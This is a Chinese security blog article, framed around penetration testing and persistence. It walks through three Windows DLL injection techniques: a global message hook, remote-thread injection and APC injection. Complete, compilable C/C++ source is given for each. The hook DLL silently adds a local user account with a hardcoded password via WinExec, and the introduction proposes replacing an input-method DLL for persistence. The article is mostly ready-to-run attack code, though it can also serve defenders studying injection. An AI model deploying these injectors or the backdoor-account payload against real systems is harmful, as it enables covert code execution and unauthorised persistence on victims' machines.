> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zD89r7DmYeh-BckddaRu3A)

在渗透过程中有时候为了权限维持或者其他等一些操作，比如以前的搜狗输入法可以替换 dll 文件当用户切换输入法就会去加载我们替换的 dll 文件，dll 文件可以自己编写一些 net user 或者其他的一些方法，也可以通过 msf 等来生成 dll 文件进行替换。

0x01 Global hook Inject
=======================

windows 中一般应用都是通过消息机制的，操作系统提高了钩子，他的作用就是用来截获和监视系统的这些消息。

**局部钩子**：针对某个线程的。 **全局钩子**：针对整个系统基于消息的应用。该钩子需要 dll 文件，在 dll 中实现对应的钩子函数。

使用 **SetWindowsHookEx** 安装 **WH_GETMESSAGE** 类型的钩子，并且钩子进程函数在一个 DLL 中，则该 DLL 可以实现全局注入

注：WH_GETMESSAGE 用来钩 PostMessage 消息。

**SetWindowsHookEx:**

```
HHOOK WINAPI SetWindowsHookEx(  _In_ int idHook，  _In_ HOOKPROC lpfn，  _In_ HINSTANCE hMod，  _In_ DWORD dwThreadId);
```

```
idHook:钩子的类型lpfn:指向钩子程序的指针，钩子过程函数。hMod:dll函数模块句柄，DllMain的第一个参数dwThreadId:hook程序关联的线程的ID。如果为0表示与系统关联的所有进程
```

如果函数执行成功则返回的是钩子过程的句柄。反之如果执行失败返回 NULL。

**DLL 实现代码：**

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include <Windows.h>HHOOK g_hHook;HMODULE g_hModule;LRESULT CALLBACK GetMsgProc(    _In_ int    code,    _In_ WPARAM wParam,    _In_ LPARAM lParam){    return CallNextHookEx(g_hHook, code, wParam, lParam);}BOOL LoadHook(void) {    g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hModule, 0);    if (g_hHook) {        WinExec("net user aspnet '1qaz@WSX' /add", SW_NORMAL);        MessageBox(NULL, TEXT("load successfully"), TEXT("title"), MB_OK);        return TRUE;    }    else {        return FALSE;    }}VOID UnloadHook(void){    if (g_hHook)        UnhookWindowsHookEx(g_hHook);}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        g_hModule = hModule;        MessageBox(NULL, TEXT("loading"), TEXT("title"), MB_OK);        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}
```

**DLL 的实现过程：**

```
1.设置钩子2.取消钩子3.钩子程序的函数4.导出相关功能
```

**钩子的回调函数：**

```
LRESULT CALLBACK GetMsgProc(    _In_ int    code,    _In_ WPARAM wParam,    _In_ LPARAM lParam){    return CallNextHookEx(g_hHook, code, wParam, lParam);}
```

回调函数的参数和返回值都是固定的，CallNextHookEx 函数表示将当前钩子传递给钩子链的笑一个钩子，第一个参数指定的就是当前钩子的句柄 g_hHook

**添加. def 文件：**

```
LIBRARYEXPORTSLoadHookUnloadHook
```

dll 是无法自己去启动的，需要一个程序来加载它。

**调用程序：**

```
#include <windows.h>#include <stdio.h>int main(){    HMODULE hModule = LoadLibraryA("Dll.dll");    if (hModule == NULL)        return 0;    FARPROC pfnLoadHook = GetProcAddress(hModule, "LoadHook");    FARPROC pfnUnloadHook = GetProcAddress(hModule, "UnloadHook");    if (pfnLoadHook == NULL || pfnUnloadHook == NULL)        return 0;    if (pfnLoadHook())        printf("load successfull");    else {        printf("load failed");        return 0;    }    printf("Press any key to unload global hook");    getchar();    pfnUnloadHook();    printf("uninstall successfull");    return 0;}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicnMSTmia3nFcHPicBhRFzXyXDciaicR3cBWsewIwxCpTLbbGHHJVDAoPZTmfjJ1eIOL1CqibhYrEe6TXg/640?wx_fmt=png)

0x02 remote injection Dll
=========================

远线程注入是指一个进程在另外一个进程中创建线程的技术。

**OpenProcess：**

```
HANDLE OpenProcess(  DWORD dwDesiredAccess,  BOOL  bInheritHandle,  DWORD dwProcessId);
```

```
1.dwDesiredAccess该参数可以是一个或多个 进程访问权限。2.如果此值为 TRUE，则此进程创建的进程将继承句柄。否则，进程不会继承这个句柄。3.要打开的本地进程的PID
```

第一个参数具体可以查看 [进程访问权限]:

https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights

**VirtualAllocEx:**

```
LPVOID VirtualAllocEx(  HANDLE hProcess,  LPVOID lpAddress,  SIZE_T dwSize,  DWORD  flAllocationType,  DWORD  flProtect);
```

```
1.hProcess:进程的句柄。该函数在该进程的虚拟地址空间内分配内存。2.lpAddress:为要分配的页面区域指定所需起始地址的指针,如果lpAddress为NULL，则该函数确定分配区域的位置。3.dwSize:要分配的内存区域的大小，以字节为单位。4.flAllocationType:内存分配的类型。
```

flAllocationType 具体可以查看 [flAllocationType]：https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(MEMORYAPI%252FVirtualAllocEx);k(VirtualAllocEx);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue

**WriteProcessMemory:**

```
BOOL WriteProcessMemory(  HANDLE  hProcess,  LPVOID  lpBaseAddress,  LPCVOID lpBuffer,  SIZE_T  nSize,  SIZE_T  *lpNumberOfBytesWritten);
```

```
1.hProcess:要修改的进程内存的句柄。句柄必须具有对进程的 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。2.lpBaseAddress:指向指定进程中写入数据的基地址的指针。3.lpBuffer:指向包含要写入指定进程地址空间的数据的缓冲区的指针。4.nSize:要写入指定进程的字节数。5.lpNumberOfBytesWritten:一个指向接收传输到指定进程的字节数的变量的指针。该参数是可选的。如果lpNumberOfBytesWritten为NULL，则忽略该参数。
```

**CreateRemoteThread:**

```
HANDLE CreateRemoteThread(  HANDLE                 hProcess,  LPSECURITY_ATTRIBUTES  lpThreadAttributes,  SIZE_T                 dwStackSize,  LPTHREAD_START_ROUTINE lpStartAddress,  LPVOID                 lpParameter,  DWORD                  dwCreationFlags,  LPDWORD                lpThreadId);
```

```
1.hProcess:要在其中创建线程的进程的句柄。2.lpThreadAttributes:指向SECURITY_ATTRIBUTES结构的指针，该 结构为新线程指定安全描述符并确定子进程是否可以继承返回的句柄。3.dwStackSize:堆栈的初始大小，以字节为单位。4.lpStartAddress:指向要由线程执行的LPTHREAD_START_ROUTINE 类型的应用程序定义函数的指针，表示远程进程中线程的起始地址。该函数必须存在于远程进程中。5.lpParameter:指向要传递给线程函数的变量的指针。6.dwCreationFlags:控制线程创建的标志。该值如果是0，线程在创建后立即运行。7.lpThreadId：指向接收线程标识符的变量的指针。
```

**程序代码：**

```
#include <stdio.h>#include <Windows.h>#include <iostream>#include <Tlhelp32.h>BOOL InjectDll(const char* szDllPath, int rProcessId) {    HANDLE hProcess = NULL;    LPVOID pDllAddr = NULL;    FARPROC pfnStartAddr = NULL;    HANDLE hRemoteThread = NULL;    //打开进程    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, rProcessId);    if (hProcess == INVALID_HANDLE_VALUE) {        return FALSE;    }    //在要注入的进程中申请内存    pDllAddr = VirtualAllocEx(hProcess, NULL, strlen(szDllPath) + 1, MEM_COMMIT, PAGE_READWRITE);    if (!pDllAddr)    {        return FALSE;    }    //给要注入的进程中写入数据    WriteProcessMemory(hProcess, pDllAddr, szDllPath, strlen(szDllPath) + 1, NULL);        //获取LoadLibraryA函数的地址    pfnStartAddr = GetProcAddress(::GetModuleHandle("Kernel32"), "LoadLibraryA");    //使用CreateRemoteThread创建远线程，注入DLL    if ((hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnStartAddr, pDllAddr, 0, NULL)) == NULL)    {        std::cout << "Injecting thread failed!" << std::endl;        return FALSE;    }    /*CloseHandle(hProcess);    CloseHandle(hRemoteThread);*/        return TRUE;}int GetProcessID(const char* szProcessNames) {    int iRet = -1;    PROCESSENTRY32 pe32;    pe32.dwSize = sizeof(PROCESSENTRY32);    HANDLE hTool32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);    BOOL bProcess = Process32First(hTool32, &pe32);    if (bProcess == TRUE)    {        while ((Process32Next(hTool32, &pe32)) == TRUE)        {            if (strcmp(pe32.szExeFile, szProcessNames) == 0)            {                iRet = pe32.th32ProcessID;                break;            }        }    }    return iRet;}int main() {    int rProcessId = GetProcessID("Demo.exe");    printf("%d",rProcessId);    if (rProcessId > 0) {        InjectDll("F:\\Dll.dll", rProcessId);    }    return 0;}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicnMSTmia3nFcHPicBhRFzXyXW6jYs0XB7PLPkmZ2ElicPf4gicLPxWicN1o2462nJmncYIhYy6MiaOh0pQ/640?wx_fmt=png)

通过 Process Monistor 查看成功注入了 dll 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicnMSTmia3nFcHPicBhRFzXyXSBMv7eficg6VoVmBOVNhAXEV77JUOZcquJTHqkoBdibmqS98dURYibIdw/640?wx_fmt=png)

0x03 APC Inject
===============

• 线程在进程内执行代码 • 线程可以利用 APC 队列异步执行代码 • 每个线程都有一个队列来存储所有的 APC• 应用程序可以将 APC 排队到给定的线程（取决于权限）• 当一个线程被调度时，排队的 APC 被执行

APC 就是为异步过程调用。

APC 注入的一般几个步骤：

• 首先通过 OpenProcess 函数打开目标进程，获取目标进程的句柄。• 然后，通过调用 WIN32 API 函数 CreateToolhelp32Snapshot、Thread32First 和 Thread32Next，遍历线程快照，获取目标进程的所有线程 ID。• 然后调用 VirtualAllocEx 函数在目标进程中申请一块内存，通过 WriteProcessMemory 函数将注入的 DLL 路径写入内存。• 最后遍历上面得到的线程 ID，调用 OpenThread 函数打开具有 THREAD_ALL_ACCESS 访问权限的线程，获取线程句柄。并调用 QueueUserAPC 函数将 APC 函数插入线程，将 APC 函数的地址设置为 LoadLibraryA 函数的地址，将 APC 函数参数设置为上述 DLL 路径地址。• 只要目标进程中的任何一个线程被唤醒，就会执行 APC 来完成 DLL 注入操作

每一个线程都有自己的 APC 队列，使用 QueueUserAPC 函数把一个 APC 函数压入 APC 队列中。

**QueueUserAPC:**

```
DWORD QueueUserAPC(  PAPCFUNC  pfnAPC,  HANDLE    hThread,  ULONG_PTR dwData);
```

```
1.pfnPAC:表示要执行的函数的地址，指向应用程序提供的 APC 函数的指针，当指定的线程执行可警报的等待操作时将调用该函数。2.hThread:线程的句柄。句柄必须具有THREAD_SET_CONTEXT访问权限。3.dwData:传递给pfnAPC参数指向的 APC 函数的单个值。
```

**实现代码：**

```
#include <Windows.h>#include<TlHelp32.h>// 根据进程名称获取PIDDWORD GetProcessPID(const char* pszProcessName){    DWORD dwProcessId = 0;    PROCESSENTRY32 pe32 = { 0 };    HANDLE hSnapshot = NULL;    BOOL bRet = FALSE;    ::RtlZeroMemory(&pe32, sizeof(pe32));    pe32.dwSize = sizeof(pe32);    // 获取进程快照    hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    if (NULL == hSnapshot)    {        MessageBox(NULL, "CreateToolhelp32Snapshot error", "TITLE", MB_OK);        return dwProcessId;    }    // 获取第一条进程快照信息    bRet = ::Process32First(hSnapshot, &pe32);    while (bRet)    {        // 获取快照信息        if (0 == ::lstrcmpi(pe32.szExeFile, pszProcessName))        {            dwProcessId = pe32.th32ProcessID;            break;        }        // 遍历下一个进程快照信息        bRet = ::Process32Next(hSnapshot, &pe32);    }    return dwProcessId;}// 根据PID获取所有的相应线程IDBOOL GetThreadID(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength){    DWORD* pThreadId = NULL;    DWORD dwThreadIdLength = 0;    DWORD dwBufferLength = 1000;    THREADENTRY32 te32 = { 0 };    HANDLE hSnapshot = NULL;    BOOL bRet = TRUE;    do    {        // 申请内存        pThreadId = new DWORD[dwBufferLength];        if (NULL == pThreadId)        {            MessageBox(NULL, "申请内存 error", "TITLE", MB_OK);            bRet = FALSE;            break;        }        ::RtlZeroMemory(pThreadId, (dwBufferLength * sizeof(DWORD)));        // 获取线程快照        ::RtlZeroMemory(&te32, sizeof(te32));        te32.dwSize = sizeof(te32);        hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);        if (NULL == hSnapshot)        {            MessageBox(NULL, "CreateToolhelp32Snapshot error", "TITLE", MB_OK);            bRet = FALSE;            break;        }        // 获取第一条线程快照信息        bRet = ::Thread32First(hSnapshot, &te32);        while (bRet)        {            // 获取进程对应的线程ID            if (te32.th32OwnerProcessID == dwProcessId)            {                pThreadId[dwThreadIdLength] = te32.th32ThreadID;                dwThreadIdLength++;            }            // 遍历下一个线程快照信息            bRet = ::Thread32Next(hSnapshot, &te32);        }        // 返回        *ppThreadId = pThreadId;        *pdwThreadIdLength = dwThreadIdLength;        bRet = TRUE;    } while (FALSE);    if (FALSE == bRet)    {        if (pThreadId)        {            delete[]pThreadId;            pThreadId = NULL;        }    }    return bRet;}// APC注入BOOL ApcInjectDll(const char* pszProcessName,const char* pszDllName){    BOOL bRet = FALSE;    DWORD dwProcessId = 0;    DWORD* pThreadId = NULL;    DWORD dwThreadIdLength = 0;    HANDLE hProcess = NULL, hThread = NULL;    PVOID pBaseAddress = NULL;    PVOID pLoadLibraryAFunc = NULL;    SIZE_T dwRet = 0, dwDllPathLen = 1 + ::lstrlen(pszDllName);    DWORD i = 0;    do    {        // 根据进程名称获取PID        dwProcessId = GetProcessPID(pszProcessName);        if (0 >= dwProcessId)        {            bRet = FALSE;            break;        }        // 根据PID获取所有的相应线程ID        bRet = GetThreadID(dwProcessId, &pThreadId, &dwThreadIdLength);        if (FALSE == bRet)        {            bRet = FALSE;            break;        }        // 打开注入进程        hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);        if (NULL == hProcess)        {            MessageBox(NULL, "OpenProcess error", "TITLE", MB_OK);            bRet = FALSE;            break;        }        // 在注入进程空间申请内存        pBaseAddress = ::VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);        if (NULL == pBaseAddress)        {            MessageBox(NULL, "VirtualAllocEx error", "TITLE", MB_OK);            bRet = FALSE;            break;        }        // 向申请的空间中写入DLL路径数据         ::WriteProcessMemory(hProcess, pBaseAddress, pszDllName, dwDllPathLen, &dwRet);        if (dwRet != dwDllPathLen)        {            MessageBox(NULL, "WriteProcessMemory error", "TITLE", MB_OK);            bRet = FALSE;            break;        }        // 获取 LoadLibrary 地址        pLoadLibraryAFunc = ::GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");        if (NULL == pLoadLibraryAFunc)        {            MessageBox(NULL, "GetProcAddress error", "TITLE", MB_OK);            bRet = FALSE;            break;        }        // 遍历线程, 插入APC        i = dwThreadIdLength;        for (; i > 0; --i)        {            // 打开线程            hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);            if (hThread)            {                // 插入APC                ::QueueUserAPC((PAPCFUNC)pLoadLibraryAFunc, hThread, (ULONG_PTR)pBaseAddress);                // 关闭线程句柄                ::CloseHandle(hThread);                hThread = NULL;            }        }        bRet = TRUE;    } while (FALSE);    // 释放内存    if (hProcess)    {        ::CloseHandle(hProcess);        hProcess = NULL;    }    if (pThreadId)    {        delete[]pThreadId;        pThreadId = NULL;    }    return bRet;}int main() {    ApcInjectDll("Demo.exe", "F:\\Dll.dll");    return 0;}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicnMSTmia3nFcHPicBhRFzXyXc5uiapiawH7iaWLgPf6k14HheHYSdxUFR8ReG28dAXsTysZnkH5zbiaNIA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicnMSTmia3nFcHPicBhRFzXyXaOrxKAicicZ9FROLVSCSeSLTVWaul9mn9ZJyXLfGibrtu8NKqTWBgibUrQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读**

[干货 ｜ 通过 HOOK 底层 API 实现进程隐藏](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498257&idx=1&sn=73f12daf207ae2c0c483295114a059de&chksm=ec1caf2edb6b26384c6938a1dee11fa56105ee4f9f6d754a8a87aa7eb38ada6c0807126da6bb&scene=21#wechat_redirect)  

[干货 | 最全 Windows 权限维持总结](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497991&idx=1&sn=886187809f935dccdc4b410fae825efa&chksm=ec1cac38db6b252ebbd39396ee20ac09b84e2dfb664fb756d14ce1e718ec567a86663c2b2a3b&scene=21#wechat_redirect)

原创投稿作者：11ccaab

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)